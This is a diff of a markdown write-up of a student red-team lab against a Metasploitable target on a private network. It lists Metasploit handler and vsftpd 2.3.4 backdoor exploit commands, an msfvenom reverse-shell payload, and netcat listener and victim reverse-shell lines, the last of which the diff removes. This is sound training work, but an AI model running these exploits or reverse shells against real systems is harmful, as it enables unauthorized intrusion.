@@ -2,174 +2,136 @@
 
 ## 🔴 Introduction
 
-Red Teaming involves simulating real-world cyber attacks to test system security. In this lab, we performed reconnaissance, exploitation, payload creation, and reverse shell to understand the complete attack lifecycle.
+This practical demonstrates real-world red teaming techniques including reconnaissance, exploitation, payload creation, and reverse shell access using Kali Linux and Metasploitable.
 
 ---
 
-# 🧠 Tools Used
+## 🟢 1. Command & Control (C2)
 
-* Kali Linux
-* Metasploit Framework
-* Nmap
-* Netcat
-* AWS CLI
+### Commands
 
----
+* msfconsole
+* use exploit/multi/handler
+* set payload windows/meterpreter/reverse_tcp
+* set LHOST 192.168.30.130
+* set LPORT 4444
 
-# 🔵 1. Reconnaissance (Nmap Scan)
+![Handler](screenshots/Screenshot_2026-04-10_12-28-07.png)
 
-## Command
-
-```
-nmap 192.168.30.129
-```
-
-## Screenshot
-
-![Nmap Scan](./Screenshot_2026-04-10_12-47-58.png)
-
-## Explanation
-
-Nmap was used to scan the target machine and identify open ports and services like FTP, SSH, MySQL, and VNC.
-
----
-
-# 🔴 2. Command & Control (Handler Setup)
-
-## Commands
-
-```
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.30.130
-set LPORT 4444
-run
-```
-
-## Screenshot
-
-![Handler](./Screenshot_2026-04-10_12-28-07.png)
-
-## Explanation
+### Explanation
 
 A reverse TCP handler was configured to listen for incoming connections from compromised systems.
 
 ---
 
-# 🟣 3. Exploitation (VSFTPD Backdoor)
+## 🔵 2. Reconnaissance (Nmap)
 
-## Commands
+### Command
 
-```
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 192.168.30.129
-set LHOST 192.168.30.130
-run
-```
+nmap 192.168.30.129
 
-## Screenshot
+![Nmap](screenshots/Screenshot_2026-04-10_12-33-33.png)
 
-![Exploit](./Screenshot_2026-04-10_12-43-24.png)
+### Explanation
 
-## Explanation
-
-The VSFTPD 2.3.4 vulnerability was exploited to gain unauthorized access to the target system.
+Nmap scanning was used to identify open ports and services on the target machine.
 
 ---
 
-# 🟡 4. Post Exploitation
+## 🟣 3. Exploitation (VSFTPD Backdoor)
 
-## Commands
+### Commands
 
-```
-getuid
-pwd
-sysinfo
-```
+* use exploit/unix/ftp/vsftpd_234_backdoor
+* set RHOSTS 192.168.30.129
+* set LHOST 192.168.30.130
+* run
 
-## Screenshot
+![Exploit](screenshots/Screenshot_2026-04-10_12-43-24.png)
 
-![Meterpreter](./Screenshot_2026-04-10_12-44-15.png)
+### Explanation
 
-## Explanation
-
-After exploitation, system information was gathered and root access was confirmed.
+The VSFTPD vulnerability was exploited to gain unauthorized access.
 
 ---
 
-# 🟠 5. Payload Creation
+## 🟡 4. Meterpreter Session
 
-## Command
+![Meterpreter](screenshots/Screenshot_2026-04-10_12-44-15.png)
 
-```
+### Commands
+
+* getuid
+* pwd
+* sysinfo
+
+### Explanation
+
+A Meterpreter session was opened, providing root-level access to the target system.
+
+---
+
+## 🟠 5. Payload Creation
+
+### Command
+
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.30.130 LPORT=4444 -f elf > shell.elf
-```
 
-## Screenshot
+![Payload](screenshots/Screenshot_2026-04-10_12-47-58.png)
 
-![Payload](./Screenshot_2026-04-10_12-56-22.png)
+### Explanation
 
-## Explanation
-
-A reverse shell payload was created using msfvenom.
+A reverse shell payload was generated using msfvenom.
 
 ---
 
-# 🔵 6. Reverse Shell (Netcat)
+## 🔴 6. Reverse Shell (Netcat)
 
-## Commands
+### Commands
 
-### Kali
-
-```
+Attacker:
 nc -lvnp 4444
-```
 
-### Victim
+Victim:
+reverse shell command
 
-```
-nc 192.168.30.130 4444 -e /bin/bash
-```
+![Listener](screenshots/Screenshot_2026-04-10_12-49-04.png)
+![Shell](screenshots/Screenshot_2026-04-10_12-56-22.png)
 
-## Screenshot
+### Explanation
 
-![Shell](./Screenshot_2026-04-10_12-49-04.png)
-
-## Explanation
-
-A reverse shell was established, allowing remote command execution on the victim machine.
+A reverse shell connection was established allowing remote command execution.
 
 ---
 
-# 🟢 7. Cloud Attack Simulation
+## 🟢 7. Cloud Simulation
 
-## Command
+### Command
 
-```
 aws --version
-```
 
-## Screenshot
+![AWS](screenshots/Screenshot_2026-04-10_11_29_55.png)
 
-![AWS](./Screenshot_2026-04-10_12-38-21.png)
-
-## Explanation
+### Explanation
 
 AWS CLI was used to simulate cloud environment interaction.
 
 ---
 
-# 🟣 Conclusion
+## ✅ Conclusion
 
-This practical demonstrated the complete attack lifecycle including reconnaissance, exploitation, payload creation, and remote access. It provided hands-on experience with real-world red teaming tools and techniques.
+This practical successfully demonstrated:
 
----
-
-# ⭐ Learning Outcome
-
-* Understood attack lifecycle
-* Gained hands-on penetration testing skills
-* Learned exploitation techniques
-* Experienced real-world cybersecurity scenarios
+* Reconnaissance
+* Exploitation
+* Post-exploitation
+* Payload generation
+* Reverse shell access
 
 ---
+
+## ⭐ Learning Outcome
+
+* Hands-on experience in penetration testing
+* Understanding of attack lifecycle
+* Practical use of cybersecurity tools
